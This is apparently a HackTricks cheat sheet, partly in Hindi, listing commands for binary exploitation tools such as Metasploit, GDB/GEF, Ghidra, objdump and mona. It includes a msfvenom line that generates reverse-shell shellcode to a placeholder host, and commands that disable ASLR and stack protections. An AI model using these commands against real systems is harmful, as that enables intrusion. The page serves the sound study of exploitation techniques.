# Exploiting Tools

{{#include ../../banners/hacktricks-training.md}}

## Metasploit
```
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```
### शेलकोड्स
```
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```
## GDB

### स्थापित करें
```
apt-get install gdb
```
### पैरामीटर
```bash
-q # No show banner
-x <file> # Auto-execute GDB instructions from here
-p <pid> # Attach to process
```
### निर्देश
```bash
run # Execute
start # Start and break in main
n/next/ni # Execute next instruction (no inside)
s/step/si # Execute next instruction
c/continue # Continue until next breakpoint
p system # Find the address of the system function
set $eip = 0x12345678 # Change value of $eip
help # Get help
quit # exit

# Disassemble
disassemble main # Disassemble the function called main
disassemble 0x12345678 # Disassemble taht address
set disassembly-flavor intel # Use intel syntax
set follow-fork-mode child/parent # Follow child/parent process

# Breakpoints
br func # Add breakpoint to function
br *func+23
br *0x12345678
del <NUM> # Delete that number of breakpoint
watch EXPRESSION # Break if the value changes

# info
info functions --> Info abount functions
info functions func --> Info of the funtion
info registers --> Value of the registers
bt # Backtrace Stack
bt full # Detailed stack
print variable
print 0x87654321 - 0x12345678 # Caculate

# x/examine
examine/<num><o/x/d/u/t/i/s/c><b/h/w/g> dir_mem/reg/puntero # Shows content of <num> in <octal/hexa/decimal/unsigned/bin/instruction/ascii/char> where each entry is a <Byte/half word (2B)/Word (4B)/Giant word (8B)>
x/o 0xDir_hex
x/2x $eip # 2Words from EIP
x/2x $eip -4 # $eip - 4
x/8xb $eip # 8 bytes (b-> byte, h-> 2bytes, w-> 4bytes, g-> 8bytes)
i r eip # Value of $eip
x/w pointer # Value of the pointer
x/s pointer # String pointed by the pointer
x/xw &pointer # Address where the pointer is located
x/i $eip # Instructions of the EIP
```
### [GEF](https://github.com/hugsy/gef)
```bash
help memory # Get help on memory command
canary # Search for canary value in memory
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings
xinfo <addr> # Shows page, size, perms, memory area and offset of the addr in the page
memory watch 0x784000 0x1000 byte #Add a view always showinf this memory
got #Check got table
memory watch $_got()+0x18 5 #Watch a part of the got table

# Vulns detection
format-string-helper #Detect insecure format strings
heap-analysis-helper #Checks allocation and deallocations of memory chunks:NULL free, UAF,double free, heap overlap

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Another way to get the offset of to the RIP
1- Put a bp after the function that overwrites the RIP and send a ppatern to ovwerwrite it
2- ef➤  i f
Stack level 0, frame at 0x7fffffffddd0:
rip = 0x400cd3; saved rip = 0x6261617762616176
called by frame at 0x7fffffffddd8
Arglist at 0x7fffffffdcf8, args:
Locals at 0x7fffffffdcf8, Previous frame's sp is 0x7fffffffddd0
Saved registers:
rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
gef➤  pattern search 0x6261617762616176
[+] Searching for '0x6261617762616176'
[+] Found at offset 184 (little-endian search) likely
```
### Tricks

#### GDB समान पते

जब आप डिबगिंग कर रहे होते हैं, GDB के पास **बाइनरी द्वारा निष्पादित किए गए पते की तुलना में थोड़ा अलग पते होंगे।** आप GDB को समान पते प्राप्त करने के लिए कर सकते हैं:

- `unset env LINES`
- `unset env COLUMNS`
- `set env _=<path>` _बाइनरी का पूर्ण पथ डालें_
- बाइनरी का शोषण करें उसी पूर्ण मार्ग का उपयोग करके
- `PWD` और `OLDPWD` GDB का उपयोग करते समय और बाइनरी का शोषण करते समय समान होना चाहिए

#### कार्यों को खोजने के लिए बैकट्रेस

जब आपके पास एक **स्थैतिक रूप से लिंक की गई बाइनरी** होती है, तो सभी कार्य बाइनरी से संबंधित होंगे (और बाहरी पुस्तकालयों से नहीं)। इस मामले में, **उपयोगकर्ता इनपुट के लिए पूछने के लिए बाइनरी द्वारा अनुसरण किए जाने वाले प्रवाह की पहचान करना कठिन होगा।**\
आप इस प्रवाह की पहचान आसानी से कर सकते हैं **gdb** के साथ बाइनरी को **चलाकर** जब तक कि आप इनपुट के लिए नहीं पूछे जाते। फिर, इसे **CTRL+C** के साथ रोकें और **`bt`** (**बैकट्रेस**) कमांड का उपयोग करें ताकि आप देख सकें कि कौन से कार्य कॉल किए गए हैं:
```
gef➤  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```
### GDB सर्वर

`gdbserver --multi 0.0.0.0:23947` (IDA में आपको Linux मशीन में executable का पूर्ण पथ भरना होगा और Windows मशीन में)

## Ghidra

### स्टैक ऑफसेट खोजें

**Ghidra** स्थानीय चर की स्थिति के बारे में जानकारी के लिए **बफर ओवरफ्लो के लिए ऑफसेट** खोजने में बहुत उपयोगी है।\
उदाहरण के लिए, नीचे दिए गए उदाहरण में, `local_bc` में एक बफर प्रवाह इंगित करता है कि आपको `0xbc` का ऑफसेट चाहिए। इसके अलावा, यदि `local_10` एक कैनरी कुकी है, तो यह इंगित करता है कि इसे `local_bc` से ओवरराइट करने के लिए `0xac` का ऑफसेट है।\
_याद रखें कि RIP जहां सहेजा गया है, वहां से पहले 0x08 RBP का है।_

![](<../../images/image (616).png>)

## GCC

**gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --> सुरक्षा के बिना संकलित करें\
**-o** --> आउटपुट\
**-g** --> कोड सहेजें (GDB इसे देख सकेगा)\
**echo 0 > /proc/sys/kernel/randomize_va_space** --> Linux में ASLR को निष्क्रिय करने के लिए

**एक शेलकोड संकलित करने के लिए:**\
**nasm -f elf assembly.asm** --> एक ".o" लौटाता है\
**ld assembly.o -o shellcodeout** --> निष्पादन योग्य

## Objdump

**-d** --> **निष्पादन योग्य** अनुभागों को असेंबल करें (संकलित शेलकोड के ऑपकोड देखें, ROP गैजेट्स खोजें, फ़ंक्शन का पता लगाएं...)\
**-Mintel** --> **इंटेल** सिंटैक्स\
**-t** --> **सिंबल्स** तालिका\
**-D** --> **सभी को असेंबल करें** (स्थिर चर का पता)\
**-s -j .dtors** --> dtors अनुभाग\
**-s -j .got** --> got अनुभाग\
\-D -s -j .plt --> **plt** अनुभाग **डीकंपाइल**\
**-TR** --> **रिलोकेशन**\
**ojdump -t --dynamic-relo ./exec | grep puts** --> GOT में संशोधन के लिए "puts" का पता\
**objdump -D ./exec | grep "VAR_NAME"** --> एक स्थिर चर का पता (ये DATA अनुभाग में संग्रहीत होते हैं)।

## कोर डंप

1. अपने प्रोग्राम को शुरू करने से पहले `ulimit -c unlimited` चलाएं
2. `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t` चलाएं
3. sudo gdb --core=\<path/core> --quiet

## अधिक

**ldd executable | grep libc.so.6** --> पता (यदि ASLR है, तो यह हर बार बदलता है)\
**for i in \`seq 0 20\`; do ldd \<Ejecutable> | grep libc; done** --> यह देखने के लिए लूप कि क्या पता बहुत बदलता है\
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system** --> "system" का ऑफसेट\
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh** --> "/bin/sh" का ऑफसेट

**strace executable** --> निष्पादन योग्य द्वारा कॉल की गई फ़ंक्शन\
**rabin2 -i ejecutable -->** सभी फ़ंक्शनों का पता

## **Inmunity डिबगर**
```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```
## IDA

### दूरस्थ लिनक्स में डिबगिंग

IDA फ़ोल्डर के अंदर आप बाइनरी पा सकते हैं जिन्हें लिनक्स के अंदर एक बाइनरी को डिबग करने के लिए उपयोग किया जा सकता है। ऐसा करने के लिए बाइनरी _linux_server_ या _linux_server64_ को लिनक्स सर्वर के अंदर ले जाएं और उस फ़ोल्डर के अंदर चलाएं जिसमें बाइनरी है:
```
./linux_server64 -Ppass
```
फिर, डिबगर को कॉन्फ़िगर करें: Debugger (linux remote) --> Proccess options...:

![](<../../images/image (101).png>)

{{#include ../../banners/hacktricks-training.md}}
